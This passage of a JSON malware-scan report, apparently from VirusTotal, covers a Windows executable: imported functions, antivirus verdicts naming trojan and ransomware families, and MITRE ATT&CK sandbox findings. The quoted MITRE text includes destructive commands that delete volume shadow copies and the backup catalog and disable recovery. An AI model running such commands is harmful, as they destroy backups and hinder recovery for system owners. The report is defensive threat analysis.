              "OleLoadPicture",
              "QueryPathOfRegTypeLib",
              "RegisterTypeLib",
              "SafeArrayAccessData",
              "SafeArrayAllocData",
              "SafeArrayAllocDescriptorEx",
              "SafeArrayCreateVector",
              "SafeArrayDestroyData",
              "SafeArrayDestroyDescriptor",
              "SafeArrayGetVartype",
              "SafeArrayUnaccessData",
              "SysAllocString",
              "SysFreeString",
              "SysReAllocString",
              "SysStringLen",
              "UnRegisterTypeLib",
              "VariantChangeType",
              "VariantClear",
              "VariantCopy",
              "VariantCopyInd",
              "VariantInit",
              "VariantTimeToSystemTime",
              "VarR8FromDec"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "DragFinish",
              "DragQueryFileW",
              "DragQueryPoint",
              "ExtractIconExW",
              "SHBrowseForFolderW",
              "Shell_NotifyIconW",
              "ShellExecuteExW",
              "ShellExecuteW",
              "SHEmptyRecycleBinW",
              "SHFileOperationW",
              "SHGetDesktopFolder",
              "SHGetFolderPathW",
              "SHGetMalloc",
              "SHGetPathFromIDListW"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CLSIDFromProgID",
              "CLSIDFromString",
              "CoCreateInstance",
              "CoCreateInstanceEx",
              "CoGetInstanceFromFile",
              "CoGetObject",
              "CoInitialize",
              "CoInitializeSecurity",
              "CoSetProxyBlanket",
              "CoTaskMemAlloc",
              "CoTaskMemFree",
              "CoUninitialize",
              "CreateStreamOnHGlobal",
              "GetRunningObjectTable",
              "IIDFromString",
              "MkParseDisplayName",
              "OleSetContainedObject",
              "OleSetMenuDescriptor",
              "ProgIDFromCLSID",
              "StringFromGUID2"
            ]
          },
          {
            "library_name": "COMCTL32.dll",
            "imported_functions": [
              "ImageList_BeginDrag",
              "ImageList_Create",
              "ImageList_Destroy",
              "ImageList_DragEnter",
              "ImageList_DragLeave",
              "ImageList_DragMove",
              "ImageList_EndDrag",
              "ImageList_Remove",
              "ImageList_ReplaceIcon",
              "ImageList_SetDragCursorImage",
              "InitCommonControlsEx"
            ]
          },
          {
            "library_name": "VERSION.dll",
            "imported_functions": [
              "GetFileVersionInfoSizeW",
              "GetFileVersionInfoW",
              "VerQueryValueW"
            ]
          },
          {
            "library_name": "WINMM.dll",
            "imported_functions": [
              "mciSendStringW",
              "timeGetTime",
              "waveOutSetVolume"
            ]
          },
          {
            "library_name": "WININET.dll",
            "imported_functions": [
              "FtpGetFileSize",
              "FtpOpenFileW",
              "HttpOpenRequestW",
              "HttpQueryInfoW",
              "HttpSendRequestW",
              "InternetCloseHandle",
              "InternetConnectW",
              "InternetCrackUrlW",
              "InternetOpenUrlW",
              "InternetOpenW",
              "InternetQueryDataAvailable",
              "InternetQueryOptionW",
              "InternetReadFile",
              "InternetSetOptionW"
            ]
          },
          {
            "library_name": "GDI32.dll",
            "imported_functions": [
              "AngleArc",
              "BeginPath",
              "CloseFigure",
              "CreateCompatibleBitmap",
              "CreateCompatibleDC",
              "CreateDCW",
              "CreateFontW",
              "CreatePen",
              "CreateSolidBrush",
              "DeleteDC",
              "DeleteObject",
              "Ellipse",
              "EndPath",
              "ExtCreatePen",
              "GetDeviceCaps",
              "GetDIBits",
              "GetObjectW",
              "GetPixel",
              "GetStockObject",
              "GetTextExtentPoint32W",
              "GetTextFaceW",
              "LineTo",
              "MoveToEx",
              "PolyDraw",
              "Rectangle",
              "RoundRect",
              "SelectObject",
              "SetBkColor",
              "SetBkMode",
              "SetPixel",
              "SetTextColor",
              "SetViewportOrgEx",
              "StretchBlt",
              "StrokeAndFillPath",
              "StrokePath"
            ]
          },
          {
            "library_name": "WSOCK32.dll",
            "imported_functions": [
              "__WSAFDIsSet",
              "accept",
              "bind",
              "closesocket",
              "connect",
              "gethostbyname",
              "gethostname",
              "htons",
              "inet_addr",
              "ioctlsocket",
              "listen",
              "ntohs",
              "recv",
              "recvfrom",
              "select",
              "send",
              "sendto",
              "setsockopt",
              "socket",
              "WSACleanup",
              "WSAGetLastError",
              "WSAStartup"
            ]
          },
          {
            "library_name": "ADVAPI32.dll",
            "imported_functions": [
              "AddAce",
              "AdjustTokenPrivileges",
              "AllocateAndInitializeSid",
              "CheckTokenMembership",
              "CopySid",
              "CreateProcessAsUserW",
              "CreateProcessWithLogonW",
              "DuplicateTokenEx",
              "FreeSid",
              "GetAce",
              "GetAclInformation",
              "GetLengthSid",
              "GetSecurityDescriptorDacl",
              "GetTokenInformation",
              "GetUserNameW",
              "InitializeAcl",
              "InitializeSecurityDescriptor",
              "InitiateSystemShutdownExW",
              "LogonUserW",
              "LookupPrivilegeValueW",
              "OpenProcessToken",
              "OpenThreadToken",
              "RegCloseKey",
              "RegConnectRegistryW",
              "RegCreateKeyExW",
              "RegDeleteKeyW",
              "RegDeleteValueW",
              "RegEnumKeyExW",
              "RegEnumValueW",
              "RegOpenKeyExW",
              "RegQueryValueExW",
              "RegSetValueExW",
              "SetSecurityDescriptorDacl"
            ]
          },
          {
            "library_name": "PSAPI.DLL",
            "imported_functions": [
              "GetProcessMemoryInfo"
            ]
          },
          {
            "library_name": "USERENV.dll",
            "imported_functions": [
              "CreateEnvironmentBlock",
              "DestroyEnvironmentBlock",
              "LoadUserProfileW",
              "UnloadUserProfile"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "AdjustWindowRectEx",
              "AttachThreadInput",
              "BeginPaint",
              "BlockInput",
              "CallWindowProcW",
              "CharLowerBuffW",
              "CharNextW",
              "CharUpperBuffW",
              "CheckMenuRadioItem",
              "ClientToScreen",
              "CloseClipboard",
              "CloseDesktop",
              "CloseWindowStation",
              "CopyImage",
              "CopyRect",
              "CountClipboardFormats",
              "CreateAcceleratorTableW",
              "CreateIconFromResourceEx",
              "CreateMenu",
              "CreatePopupMenu",
              "CreateWindowExW",
              "DefDlgProcW",
              "DefWindowProcW",
              "DeleteMenu",
              "DestroyAcceleratorTable",
              "DestroyIcon",
              "DestroyMenu",
              "DestroyWindow",
              "DialogBoxParamW",
              "DispatchMessageW",
              "DrawFocusRect",
              "DrawFrameControl",
              "DrawMenuBar",
              "DrawTextW",
              "EmptyClipboard",
              "EnableWindow",
              "EndDialog",
              "EndPaint",
              "EnumChildWindows",
              "EnumThreadWindows",
              "EnumWindows",
              "ExitWindowsEx",
              "FillRect",
              "FindWindowExW",
              "FindWindowW",
              "FlashWindow",
              "FrameRect",
              "GetActiveWindow",
              "GetAsyncKeyState",
              "GetCaretPos",
              "GetClassLongW",
              "GetClassNameW",
              "GetClientRect",
              "GetClipboardData",
              "GetCursorInfo",
              "GetCursorPos",
              "GetDC",
              "GetDesktopWindow",
              "GetDlgCtrlID",
              "GetDlgItem",
              "GetFocus",
              "GetForegroundWindow",
              "GetKeyboardLayoutNameW",
              "GetKeyboardState",
              "GetKeyState",
              "GetMenu",
              "GetMenuItemCount",
              "GetMenuItemID",
              "GetMenuItemInfoW",
              "GetMenuStringW",
              "GetMessageW",
              "GetMonitorInfoW",
              "GetParent",
              "GetProcessWindowStation",
              "GetSubMenu",
              "GetSysColor",
              "GetSysColorBrush",
              "GetSystemMetrics",
              "GetUserObjectSecurity",
              "GetWindowDC",
              "GetWindowLongW",
              "GetWindowRect",
              "GetWindowTextLengthW",
              "GetWindowTextW",
              "GetWindowThreadProcessId",
              "InflateRect",
              "InsertMenuItemW",
              "InvalidateRect",
              "IsCharAlphaNumericW",
              "IsCharAlphaW",
              "IsCharLowerW",
              "IsCharUpperW",
              "IsClipboardFormatAvailable",
              "IsDialogMessageW",
              "IsDlgButtonChecked",
              "IsIconic",
              "IsMenu",
              "IsWindow",
              "IsWindowEnabled",
              "IsWindowVisible",
              "IsZoomed",
              "keybd_event",
              "KillTimer",
              "LoadCursorW",
              "LoadIconW",
              "LoadImageW",
              "LoadStringW",
              "LockWindowUpdate",
              "MapVirtualKeyW",
              "MessageBeep",
              "MessageBoxA",
              "MessageBoxW",
              "MonitorFromPoint",
              "MonitorFromRect",
              "mouse_event",
              "MoveWindow",
              "OpenClipboard",
              "OpenDesktopW",
              "OpenWindowStationW",
              "PeekMessageW",
              "PostMessageW",
              "PostQuitMessage",
              "PtInRect",
              "RedrawWindow",
              "RegisterClassExW",
              "RegisterHotKey",
              "RegisterWindowMessageW",
              "ReleaseCapture",
              "ReleaseDC",
              "ScreenToClient",
              "SendDlgItemMessageW",
              "SendInput",
              "SendMessageTimeoutW",
              "SendMessageW",
              "SetActiveWindow",
              "SetCapture",
              "SetClipboardData",
              "SetCursor",
              "SetFocus",
              "SetForegroundWindow",
              "SetKeyboardState",
              "SetLayeredWindowAttributes",
              "SetMenu",
              "SetMenuDefaultItem",
              "SetMenuItemInfoW",
              "SetProcessWindowStation",
              "SetRect",
              "SetTimer",
              "SetUserObjectSecurity",
              "SetWindowLongW",
              "SetWindowPos",
              "SetWindowTextW",
              "ShowWindow",
              "SystemParametersInfoW",
              "TrackPopupMenuEx",
              "TranslateAcceleratorW",
              "TranslateMessage",
              "UnregisterHotKey",
              "VkKeyScanW",
              "wsprintfW"
            ]
          }
        ],
        "entry_point": 158711
      },
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 43,
        "undetected": 28
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W32.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Generic.me6H",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.59.12300",
          "result": "Trojan.DownLoader24.3715",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.1.0.0",
          "result": "Win.Dropper.XtremeRAT-7598019-0",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.GenericKD.65763334",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20230607"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.GenericKD.65763334",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Ransom.Win32.Blocker.Vcaj",
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.93.48759",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.65763334",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.93.48760",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.5fd6f0",
          "method": "blacklist",
          "engine_update": "20210330"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Generic.D3EB7806",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230621"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.477",
          "result": "Trojan.Win32.Packed.BPYT",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": "W32/ABRisk.GZAK-2148",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.MBT",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.95",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20230620"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "27471",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "APEX": {
          "category": "malicious",
          "engine_name": "APEX",
          "engine_version": "6.426",
          "result": "Malicious",
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan-Ransom.Win32.Blocker.kdag",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "Ransom:Win32/Blocker.1aed10cd",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25785",
          "result": "Trojan.Win32.Blocker.juubdx",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230622"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.65763334",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4901",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Ransom_Blocker.R002C0PBJ23",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win32.RealProtect.ch",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.446",
          "result": "suspicious.low.ml.score",
          "method": "blacklist",
          "engine_update": "20230412"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.GenericKD.65763334",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.GenericKD.65763334 (B)",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.2.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230404"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "230626-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230625"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=88)",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "RiskWare/AU3.StartPage.a",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.125.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "35771",
          "result": "Malware@#320z62brrmhob",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23050.3",
          "result": "Trojan:Win32/Wacatac.B!ml",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan-Ransom.Win32.Blocker.kdag",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36097B:27.32195",
          "result": "Trojan.GenericKD.65763334",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1687802425",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.23.3.10396",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.114",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230219"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "RDN/Ransom",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-06-26.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Generic.Malware/Suspicious",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/CI.A",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Ransom_Blocker.R002C0PBJ23",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.1.14.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.200764597.susgen",
          "method": "blacklist",
          "engine_update": "20230624"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "6.4.258.0",
          "result": "W32/PossibleThreat",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "22.11.7701.0",
          "result": "Win32:Malware-gen",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "22.11.7701.0",
          "result": "Win32:Malware-gen",
          "method": "blacklist",
          "engine_update": "20230626"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "reputation": -1,
      "sigma_analysis_stats": {
        "high": 1,
        "medium": 7,
        "critical": 0,
        "low": 1
      }
    },
    "type": "file",
    "id": "08c2d3fec8cd9fcced634df7ad0f3db164ffe0cbfc263e2d8be026afca05bfcb",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/08c2d3fec8cd9fcced634df7ad0f3db164ffe0cbfc263e2d8be026afca05bfcb"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Changes the start page of internet explorer"
                  },
                  {
                    "severity": "LOW",
                    "description": "Modifies Internet Explorer zone settings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1185/",
                "id": "T1185",
                "name": "Browser Session Hijacking"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "id": "TA0009",
            "name": "Collection"
          },
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your devices and data.\n\nThe impact tactic consists of techniques used by the adversary to execute his or her mission objectives but that do not cleanly fit into another category such as Collection. Mission objectives vary based on each adversary's goals, but examples include toll fraud, destruction of device data, or locking the user out of his or her device until a ransom is paid.",
            "techniques": [
              {
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\nFor attacks attempting to saturate the providing network, see Network Denial of Service.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Increases the number of concurrent connection per server for Internet Explorer"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1499/",
                "id": "T1499",
                "name": "Endpoint Denial of Service"
              },
              {
                "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\nvssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet\nWindows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy delete\nwbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet\nbcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\nREAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Disables Windows system restore"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1490/",
                "id": "T1490",
                "name": "Inhibit System Recovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0034/",
            "id": "TA0034",
            "name": "Impact"
          },
          {
